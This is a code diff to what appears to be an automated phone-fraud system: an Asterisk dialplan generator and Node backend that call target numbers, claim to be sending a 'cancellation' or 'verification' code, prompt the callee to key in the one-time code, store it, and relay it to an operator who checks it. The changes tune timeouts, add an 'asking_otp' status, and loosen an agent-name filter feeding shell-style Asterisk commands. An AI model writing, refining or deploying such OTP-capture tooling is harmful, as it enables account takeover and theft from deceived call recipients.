@@ -1662,7 +1662,7 @@ export interface CallState {
   number: string;
   channel?: string;
   bridgedChannel?: string;
-  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'talking_agent' | 'on_hold' | 'pressed_1' | 'asking_cancel_code' | 'otp_captured' | 'otp_valid' | 'otp_invalid' | 'cancel_valid' | 'cancel_invalid' | 'playing_audio' | 'audio_completed' | 'machine' | 'machine_detected' | 'retrying' | 'ended' | 'transferred';
+  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'talking_agent' | 'on_hold' | 'pressed_1' | 'asking_cancel_code' | 'asking_otp' | 'otp_captured' | 'otp_valid' | 'otp_invalid' | 'cancel_valid' | 'cancel_invalid' | 'playing_audio' | 'audio_completed' | 'machine' | 'machine_detected' | 'retrying' | 'ended' | 'transferred';
   digit?: string;
   cause?: string;
   agent?: string;
@@ -5781,8 +5781,8 @@ export function generateCleanDialplanConf(
 
   dialplanContent += `; CLIENTE MARCA 1 -> REPRODUCE "UN MOMENTO POR FAVOR, LE ESTAMOS ENVIANDO UN CODIGO DE CANCELACION", AVISA AL AGENTE Y ESPERA HASTA QUE EL AGENTE ENVIE EL CODIGO\n`;
   dialplanContent += `exten => 1,1,NoOp(=== [IVR-PRESS1-CANCEL] DIGITO 1 DETECTADO -> AVISANDO AL AGENTE PARA QUE ENVIE EL CODIGO ===)\n`;
-  dialplanContent += ` same => n,Set(TIMEOUT(digit)=5)\n`;
-  dialplanContent += ` same => n,Set(TIMEOUT(response)=15)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(digit)=3)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(response)=12)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_NUM}" != ""]?\${TARGET_NUM}:\${IF($["\${CUSTOMER_NUM}" != ""]?\${CUSTOMER_NUM}:\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})})})\n`;
   dialplanContent += ` same => n,Set(__TARGET_NUM=\${TARGET_NUM})\n`;
   dialplanContent += ` same => n,Set(__TARGET_DEST=\${TARGET_NUM})\n`;
@@ -5807,7 +5807,6 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "valid"]?cancel_approved)\n`;
   dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "invalid"]?cancel_rejected)\n`;
   dialplanContent += ` same => n,GotoIf($[\${SEND_WAIT_LOOP} >= 120]?agent_ready_ask_code)\n`;
-  dialplanContent += ` same => n,ExecIf($[$[\${SEND_WAIT_LOOP} % 15] = 0]?Playback(beep))\n`;
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Goto(wait_agent_send_code)\n`;
   dialplanContent += ` same => n(agent_ready_ask_code),NoOp(=== [IVR-PRESS1-CANCEL] Agente envio el codigo -> Solicitando al cliente que lo digite ===)\n`;
@@ -5817,16 +5816,12 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n(ask_cancel_code),Set(CANCEL_RETRIES=$[\${CANCEL_RETRIES} + 1])\n`;
   dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR-PRESS1-CANCEL] Solicitando codigo de cancelacion (\${CANCEL_RETRIES}/3) con audio: \${IVR_CANCEL_PROMPT} ===)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_CANCEL_PROMPT},10,,2,15)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_CANCEL_PROMPT},10,,1,12)\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR-PRESS1-CANCEL] Resultado Read 1: READSTATUS=\${READSTATUS} | USER_DIGITS=\${USER_DIGITS} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?cancel_code_captured)\n`;
   dialplanContent += ` same => n,Set(MID_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${DB(otp_status/\${TARGET_NUM})})})})\n`;
   dialplanContent += ` same => n,GotoIf($["\${MID_STATUS}" = "valid"]?cancel_approved)\n`;
   dialplanContent += ` same => n,GotoIf($["\${MID_STATUS}" = "invalid"]?cancel_rejected)\n`;
-  dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,beep,10,,2,8)\n`;
-  dialplanContent += ` same => n,NoOp(=== [IVR-PRESS1-CANCEL] Resultado Read 2: READSTATUS=\${READSTATUS} | USER_DIGITS=\${USER_DIGITS} ===)\n`;
-  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?cancel_code_captured)\n`;
   dialplanContent += ` same => n,GotoIf($[\${CANCEL_RETRIES} < 3]?ask_cancel_code)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(cancel_code_captured),NoOp(=== [IVR-PRESS1-CANCEL] CODIGO DE CANCELACION DIGITADO: \${USER_DIGITS} -> ENVIANDO A AGENTE \${FINAL_AGENT} ===)\n`;
@@ -5858,7 +5853,6 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?cancel_approved)\n`;
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?cancel_rejected)\n`;
   dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 90]?cancel_timeout)\n`;
-  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 8] = 0]?Playback(beep))\n`;
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Goto(wait_cancel_decision)\n\n`;
   dialplanContent += ` same => n(cancel_approved),NoOp(=== [IVR-PRESS1-CANCEL] CODIGO VALIDO APROBADO POR AGENTE ===)\n`;
@@ -6043,8 +6037,8 @@ export function generateCleanDialplanConf(
 
   dialplanContent += `; CLIENTE PRESIONA 1 -> REPRODUCE "UN MOMENTO POR FAVOR, LE ESTAMOS ENVIANDO SU CODIGO DE VERIFICACION" -> CAPTURA Y VALIDACION EN LIVECALLSTAB\n`;
   dialplanContent += `exten => 1,1,NoOp(=== [IVR-OTP-VERIFY] DIGITO 1 DETECTADO -> ENVIANDO CODIGO DE VERIFICACION ===)\n`;
-  dialplanContent += ` same => n,Set(TIMEOUT(digit)=5)\n`;
-  dialplanContent += ` same => n,Set(TIMEOUT(response)=15)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(digit)=3)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(response)=12)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_NUM}" != ""]?\${TARGET_NUM}:\${IF($["\${CUSTOMER_NUM}" != ""]?\${CUSTOMER_NUM}:\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})})})\n`;
   dialplanContent += ` same => n,Set(__TARGET_NUM=\${TARGET_NUM})\n`;
   dialplanContent += ` same => n,Set(__TARGET_DEST=\${TARGET_NUM})\n`;
@@ -6057,24 +6051,22 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,UserEvent(Press1Detected,Number=\${TARGET_NUM},Digit=1,Mode=otp_press1,Channel=\${CHANNEL})\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=pressed_1&digit=1&mode=otp_press1&agent=\${URIENCODE(\${FINAL_AGENT})}&tenant=\${URIENCODE(\${TENANT_ID})}&userid=\${URIENCODE(\${CALL_USER_ID})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
   dialplanContent += ` same => n,Playback(\${IVR_OTP_VERIFY_WAIT})\n`;
-  dialplanContent += ` same => n,Wait(2)\n`;
+  dialplanContent += ` same => n,Wait(0.2)\n`;
   dialplanContent += ` same => n,Set(PRE_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${DB(otp_status/\${TARGET_NUM})})})})\n`;
   dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "valid"]?otp_verify_approved)\n`;
   dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "invalid"]?otp_verify_rejected)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=asking_otp)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=asking_otp&mode=otp_press1&agent=\${URIENCODE(\${FINAL_AGENT})}&tenant=\${URIENCODE(\${TENANT_ID})}&userid=\${URIENCODE(\${CALL_USER_ID})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
   dialplanContent += ` same => n,Set(OTP_V_RETRIES=0)\n`;
   dialplanContent += ` same => n(ask_otp_verify),Set(OTP_V_RETRIES=$[\${OTP_V_RETRIES} + 1])\n`;
   dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR-OTP-VERIFY] Solicitando codigo OTP (\${OTP_V_RETRIES}/3) con audio: \${IVR_OTP_PROMPT} ===)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_OTP_PROMPT},10,,2,15)\n`;
-  dialplanContent += ` same => n,NoOp(=== [IVR-OTP-VERIFY] Resultado Read 1: READSTATUS=\${READSTATUS} | USER_DIGITS=\${USER_DIGITS} ===)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_OTP_PROMPT},10,,1,12)\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR-OTP-VERIFY] Resultado Read: READSTATUS=\${READSTATUS} | USER_DIGITS=\${USER_DIGITS} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?otp_verify_captured)\n`;
   dialplanContent += ` same => n,Set(MID_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${DB(otp_status/\${TARGET_NUM})})})})\n`;
   dialplanContent += ` same => n,GotoIf($["\${MID_STATUS}" = "valid"]?otp_verify_approved)\n`;
   dialplanContent += ` same => n,GotoIf($["\${MID_STATUS}" = "invalid"]?otp_verify_rejected)\n`;
-  dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,beep,10,,2,8)\n`;
-  dialplanContent += ` same => n,NoOp(=== [IVR-OTP-VERIFY] Resultado Read 2: READSTATUS=\${READSTATUS} | USER_DIGITS=\${USER_DIGITS} ===)\n`;
-  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?otp_verify_captured)\n`;
   dialplanContent += ` same => n,GotoIf($[\${OTP_V_RETRIES} < 3]?ask_otp_verify)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(otp_verify_captured),NoOp(=== [IVR-OTP-VERIFY] CODIGO OTP DIGITADO: \${USER_DIGITS} -> ENVIANDO A AGENTE \${FINAL_AGENT} ===)\n`;
@@ -6085,6 +6077,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM}_\${FINAL_AGENT})=pending)\n`;
   dialplanContent += ` same => n,ExecIf($["\${CID_DIGITS}" != "" & "\${CID_DIGITS}" != "\${TARGET_NUM}"]?Set(DB(otp_status/\${CID_DIGITS})=pending))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CID_DIGITS}" != "" & "\${CID_DIGITS}" != "\${TARGET_NUM}"]?Set(DB(otp_status/\${CID_DIGITS}_\${FINAL_AGENT})=pending))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CALLERID(num)}" != "" & "\${CALLERID(num)}" != "\${TARGET_NUM}"]?Set(DB(otp_agent/\${CALLERID(num)})=\${FINAL_AGENT}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CALLERID(num)}" != "" & "\${CALLERID(num)}" != "\${TARGET_NUM}"]?Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CALLERID(num)}" != "" & "\${CALLERID(num)}" != "\${TARGET_NUM}"]?Set(DB(otp_status/\${CALLERID(num)})=pending))\n`;
@@ -6106,7 +6099,6 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?otp_verify_approved)\n`;
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?otp_verify_rejected)\n`;
   dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 90]?otp_verify_timeout)\n`;
-  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 8] = 0]?Playback(beep))\n`;
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Goto(wait_otp_verify_decision)\n\n`;
   dialplanContent += ` same => n(otp_verify_approved),NoOp(=== [IVR-OTP-VERIFY] CODIGO OTP VALIDADO POR AGENTE ===)\n`;
@@ -10891,7 +10883,7 @@ app.all('/api/asterisk/otp/capture', requireInternalOrGlobalAdmin, (req, res) =>
         if (entry && entry.status !== 'ended' && entry.status !== 'machine' && entry.status !== 'machine_detected') {
           (entry as any).capturedOtp = cleanOtp;
           (entry as any).otpStatus = cleanStatus;
-          if (entry.status === 'asking_cancel_code' || entry.status === 'pressed_1' || entry.status === 'in_ivr') {
+          if (entry.status === 'asking_otp' || entry.status === 'asking_cancel_code' || entry.status === 'pressed_1' || entry.status === 'in_ivr') {
             entry.status = 'otp_captured';
           }
           if (cleanAgent) entry.agent = cleanAgent;
@@ -10996,15 +10988,15 @@ app.post('/api/asterisk/otp/decision', requireActiveMembership, async (req, res)
     const effectiveOtp = reqOtp || (targetRecord?.otp ? String(targetRecord.otp).replace(/[^0-9*#]/g, '').trim() : '');
 
     // Determine the exact agent/extension that originally answered the call
-    const cleanAgentParam = (agent && agent !== 'ringall' && agent !== 'all') ? String(agent).replace(/[^a-zA-Z0-9_\-]/g, '') : undefined;
+    const cleanAgentParam = (agent && agent !== 'ringall' && agent !== 'all') ? String(agent).replace(/[^a-zA-Z0-9_\-&]/g, '') : undefined;
     let returnAgent = cleanAgentParam;
     if (!returnAgent && targetRecord?.agent && targetRecord.agent !== 'ringall' && targetRecord.agent !== 'all') {
-      returnAgent = String(targetRecord.agent).replace(/[^a-zA-Z0-9_\-]/g, '');
+      returnAgent = String(targetRecord.agent).replace(/[^a-zA-Z0-9_\-&]/g, '');
     }
     if (!returnAgent && cleanNum) {
       const callInfo = callStatusStore.get(cleanNum) || callStatusStore.get(clean10) || callStatusStore.get(`1${clean10}`);
       if (callInfo?.agent && callInfo.agent !== 'ringall' && callInfo.agent !== 'all') {
-        returnAgent = String(callInfo.agent).replace(/[^a-zA-Z0-9_\-]/g, '');
+        returnAgent = String(callInfo.agent).replace(/[^a-zA-Z0-9_\-&]/g, '');
       }
     }
 
@@ -11025,11 +11017,15 @@ app.post('/api/asterisk/otp/decision', requireActiveMembership, async (req, res)
     addCandidateVariants(targetRecord?.number);
     const candidateKeys = Array.from(candidateKeysSet);
 
+    const agentPartsForDb = returnAgent
+      ? Array.from(new Set([returnAgent, ...returnAgent.split('&').map((s) => s.trim()).filter(Boolean)]))
+      : [];
+
     const dbWrites: Promise<any>[] = [];
     for (const nk of candidateKeys) {
       dbWrites.push(executeAsteriskCommand(`database put otp_status "${nk}" "${status}"`).catch(() => {}));
-      if (returnAgent) {
-        dbWrites.push(executeAsteriskCommand(`database put otp_status "${nk}_${returnAgent}" "${status}"`).catch(() => {}));
+      for (const ag of agentPartsForDb) {
+        dbWrites.push(executeAsteriskCommand(`database put otp_status "${nk}_${ag}" "${status}"`).catch(() => {}));
       }
       if (status === 'valid' && returnAgent) {
         dbWrites.push(
@@ -12391,6 +12387,8 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
         ? 'En espera (Hold)'
         : call.status === 'pressed_1' && call.mode === 'otp_press1'
         ? 'Presionó 1 — Enviando código de verificación'
+        : call.status === 'asking_otp'
+        ? 'Solicitando al cliente digitar el código OTP'
         : call.status === 'pressed_1' && call.mode === 'cancel_code'
         ? '¡Presionó 1! — Envía el código de cancelación ahora'
         : call.status === 'asking_cancel_code'
